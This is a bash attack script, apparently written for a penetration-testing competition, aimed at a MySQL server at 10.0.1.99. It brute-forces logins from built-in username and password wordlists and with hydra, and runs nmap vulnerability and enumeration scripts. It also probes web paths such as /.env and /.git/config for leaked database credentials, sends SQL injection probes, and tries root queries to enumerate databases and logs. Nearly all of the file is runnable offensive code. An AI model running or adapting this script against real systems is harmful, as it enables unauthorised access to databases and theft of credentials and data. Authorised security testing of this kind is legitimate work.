#!/bin/bash
# Database Security Agent
# Target: 10.0.1.99:3306 (MySQL 8.0.43)
# Focus: Credential testing, enumeration, vulnerability assessment

set -e

TARGET="10.0.1.99"
PORT="3306"
EVIDENCE_DIR="/home/pentester/cptc/hosts/10.0.1.99-go-mysql/evidence"
FINDINGS_DIR="/home/pentester/cptc/hosts/10.0.1.99-go-mysql/findings"

mkdir -p "$EVIDENCE_DIR/database-security"
mkdir -p "$FINDINGS_DIR"

AGENT_LOG="$EVIDENCE_DIR/database-security/agent-database-security.log"
echo "[$(date)] Database Security Agent Started" | tee -a "$AGENT_LOG"

# Phase 1: Extensive Credential Testing
echo "[$(date)] Phase 1: Comprehensive Credential Testing" | tee -a "$AGENT_LOG"

# Create credential wordlists
cat > /tmp/mysql-users.txt << 'EOF'
root
admin
mysql
user
test
guest
webapp
app
application
goapp
golang
developer
dev
prod
staging
dbadmin
dbuser
monitor
backup
replication
slave
master
EOF

cat > /tmp/mysql-passwords.txt << 'EOF'

password
Password
password123
Password123
admin
Admin
admin123
mysql
Mysql
mysql123
root
Root
root123
test
Test
test123
changeme
letmein
welcome
Welcome1
P@ssw0rd
P@ssword1
Pass123
database
Database1
db123
goapp
golang
Go123
app123
webapp
web123
secret
Secret1
qwerty
123456
12345678
abc123
monkey
dragon
master
shadow
superman
EOF

# Test each credential combination
while IFS= read -r username; do
    while IFS= read -r password; do
        echo "[$(date)] Testing: ${username}:${password}" | tee -a "$AGENT_LOG"

        # Test with mysql client
        if [ -z "$password" ]; then
            timeout 5 mysql -h "$TARGET" -P "$PORT" -u "$username" -e "SELECT VERSION();" \
                > "$EVIDENCE_DIR/database-security/cred-test-${username}-empty.txt" 2>&1 && \
                echo "[FOUND] ${username}:(empty)" | tee -a "$AGENT_LOG" "$EVIDENCE_DIR/database-security/CREDENTIALS-FOUND.txt" || true
        else
            timeout 5 mysql -h "$TARGET" -P "$PORT" -u "$username" -p"$password" -e "SELECT VERSION();" \
                > "$EVIDENCE_DIR/database-security/cred-test-${username}-${password}.txt" 2>&1 && \
                echo "[FOUND] ${username}:${password}" | tee -a "$AGENT_LOG" "$EVIDENCE_DIR/database-security/CREDENTIALS-FOUND.txt" || true
        fi

        sleep 0.3
    done < /tmp/mysql-passwords.txt
done < /tmp/mysql-users.txt

# Phase 2: MySQL Version-Specific Vulnerability Testing
echo "[$(date)] Phase 2: MySQL 8.0.43 Vulnerability Assessment" | tee -a "$AGENT_LOG"

# Check for known MySQL 8.0.43 vulnerabilities
echo "[$(date)] Checking MySQL 8.0.43 CVE database" | tee -a "$AGENT_LOG"

# Test for authentication bypass vulnerabilities
nmap -p 3306 --script mysql-vuln-cve2012-2122 "$TARGET" > \
    "$EVIDENCE_DIR/database-security/vuln-cve-2012-2122.txt" 2>&1 || true

# Test for information disclosure
nmap -p 3306 --script mysql-info "$TARGET" > \
    "$EVIDENCE_DIR/database-security/mysql-detailed-info.txt" 2>&1 || true

# Test for empty password
nmap -p 3306 --script mysql-empty-password "$TARGET" > \
    "$EVIDENCE_DIR/database-security/empty-password-test.txt" 2>&1 || true

# Phase 3: Network-based Database Enumeration
echo "[$(date)] Phase 3: Network Enumeration" | tee -a "$AGENT_LOG"

# Capture MySQL banner and version details
nmap -p 3306 -sV --script mysql-enum "$TARGET" > \
    "$EVIDENCE_DIR/database-security/mysql-enum.txt" 2>&1 || true

# Test MySQL protocols
nmap -p 3306 --script mysql-variables,mysql-databases,mysql-users "$TARGET" > \
    "$EVIDENCE_DIR/database-security/mysql-scripts.txt" 2>&1 || true

# Phase 4: MySQL Client Protocol Analysis
echo "[$(date)] Phase 4: Protocol Analysis" | tee -a "$AGENT_LOG"

# Try to connect and capture server response
timeout 5 mysql -h "$TARGET" -P "$PORT" -u nonexistent 2>&1 | \
    tee "$EVIDENCE_DIR/database-security/protocol-response.txt" || true

# Test various connection methods
for ssl_mode in DISABLED PREFERRED REQUIRED; do
    echo "[$(date)] Testing SSL mode: $ssl_mode" | tee -a "$AGENT_LOG"
    timeout 5 mysql -h "$TARGET" -P "$PORT" -u root --ssl-mode="$ssl_mode" -e "SELECT 1;" \
        > "$EVIDENCE_DIR/database-security/ssl-mode-${ssl_mode}.txt" 2>&1 || true
done

# Phase 5: Search for Credentials in Web Applications
echo "[$(date)] Phase 5: Credential Discovery from Web Apps" | tee -a "$AGENT_LOG"

# Look for common configuration endpoints that might leak DB credentials
CONFIG_ENDPOINTS=(
    "/.env"
    "/config"
    "/config.json"
    "/config.yaml"
    "/config.yml"
    "/database.yml"
    "/db.json"
    "/settings.json"
    "/app.config"
    "/application.properties"
    "/application.yml"
    "/.git/config"
    "/backup/config"
    "/config.bak"
    "/config.old"
)

for endpoint in "${CONFIG_ENDPOINTS[@]}"; do
    echo "[$(date)] Checking for config at: $endpoint" | tee -a "$AGENT_LOG"

    # Try port 80
    curl -s -m 5 "http://${TARGET}${endpoint}" > \
        "$EVIDENCE_DIR/database-security/web-config-80${endpoint//\//-}.txt" 2>&1 || true

    # Try port 443
    curl -s -k -m 5 "https://${TARGET}${endpoint}" > \
        "$EVIDENCE_DIR/database-security/web-config-443${endpoint//\//-}.txt" 2>&1 || true

    # Try port 8080
    curl -s -k -m 5 "https://${TARGET}:8080${endpoint}" > \
        "$EVIDENCE_DIR/database-security/web-config-8080${endpoint//\//-}.txt" 2>&1 || true

    sleep 0.5
done

# Phase 6: Look for Database References in API Responses
echo "[$(date)] Phase 6: API Response Analysis for DB Info" | tee -a "$AGENT_LOG"

# Test error-inducing payloads to trigger database errors
ERROR_PAYLOADS=(
    "/api/users/'"
    "/api/users/999999999"
    "/api/users/-1"
    "/api/users/0"
    "/api?id='"
    "/api?id=1'"
    "/api?id=1%27"
    "/api?id=1%20OR%201=1--"
)

for payload in "${ERROR_PAYLOADS[@]}"; do
    echo "[$(date)] Testing error payload: $payload" | tee -a "$AGENT_LOG"

    curl -s -k -m 5 "http://${TARGET}${payload}" > \
        "$EVIDENCE_DIR/database-security/error-test-80-${payload//[\/\'\?=]/-}.txt" 2>&1 || true

    curl -s -k -m 5 "https://${TARGET}${payload}" > \
        "$EVIDENCE_DIR/database-security/error-test-443-${payload//[\/\'\?=]/-}.txt" 2>&1 || true

    sleep 0.5
done

# Phase 7: MySQL UDF and Plugin Testing
echo "[$(date)] Phase 7: MySQL Plugin and UDF Testing" | tee -a "$AGENT_LOG"

# Test for dangerous plugins that might be enabled
nmap -p 3306 --script mysql-audit "$TARGET" > \
    "$EVIDENCE_DIR/database-security/mysql-audit.txt" 2>&1 || true

# Phase 8: Brute Force with Hydra (limited)
echo "[$(date)] Phase 8: Targeted Brute Force Attack" | tee -a "$AGENT_LOG"

# Create small targeted password list
cat > /tmp/mysql-targeted-pass.txt << 'EOF'
password
admin
mysql
root
test
Password1
Admin123
Mysql123
Root123
Test123
goapp123
golang123
webapp123
database123
EOF

# Run hydra with small wordlist (production-safe)
hydra -L /tmp/mysql-users.txt -P /tmp/mysql-targeted-pass.txt \
    -t 4 -f -V mysql://"$TARGET" > \
    "$EVIDENCE_DIR/database-security/hydra-brute-force.txt" 2>&1 || true

# Phase 9: Check for MySQL in Connection with Other Network Hosts
echo "[$(date)] Phase 9: Network Relationship Analysis" | tee -a "$AGENT_LOG"

# If we find credentials, check what databases exist and look for network references
echo "[$(date)] Attempting to find database network references" | tee -a "$AGENT_LOG"

# Try common web application databases
COMMON_DBS=("mysql" "information_schema" "webapp" "app" "goapp" "test" "dev" "prod")

for db in "${COMMON_DBS[@]}"; do
    timeout 5 mysql -h "$TARGET" -P "$PORT" -u root -D "$db" -e "SHOW TABLES;" \
        > "$EVIDENCE_DIR/database-security/db-enum-${db}.txt" 2>&1 || true
done

# Phase 10: Test MySQL Binary Logging and Replication
echo "[$(date)] Phase 10: MySQL Replication and Logging Test" | tee -a "$AGENT_LOG"

# Check if binary logging is enabled (could leak information)
timeout 5 mysql -h "$TARGET" -P "$PORT" -u root -e "SHOW BINARY LOGS;" \
    > "$EVIDENCE_DIR/database-security/binary-logs.txt" 2>&1 || true

# Check replication status
timeout 5 mysql -h "$TARGET" -P "$PORT" -u root -e "SHOW SLAVE STATUS\G" \
    > "$EVIDENCE_DIR/database-security/slave-status.txt" 2>&1 || true

echo "[$(date)] Database Security Agent Completed" | tee -a "$AGENT_LOG"
echo "[$(date)] Results saved to: $EVIDENCE_DIR/database-security/" | tee -a "$AGENT_LOG"

# Summary of findings
echo "[$(date)] Generating summary..." | tee -a "$AGENT_LOG"

if [ -f "$EVIDENCE_DIR/database-security/CREDENTIALS-FOUND.txt" ]; then
    echo "[SUCCESS] Valid credentials found!" | tee -a "$AGENT_LOG"
    cat "$EVIDENCE_DIR/database-security/CREDENTIALS-FOUND.txt" | tee -a "$AGENT_LOG"
else
    echo "[INFO] No valid credentials found through automated testing" | tee -a "$AGENT_LOG"
fi
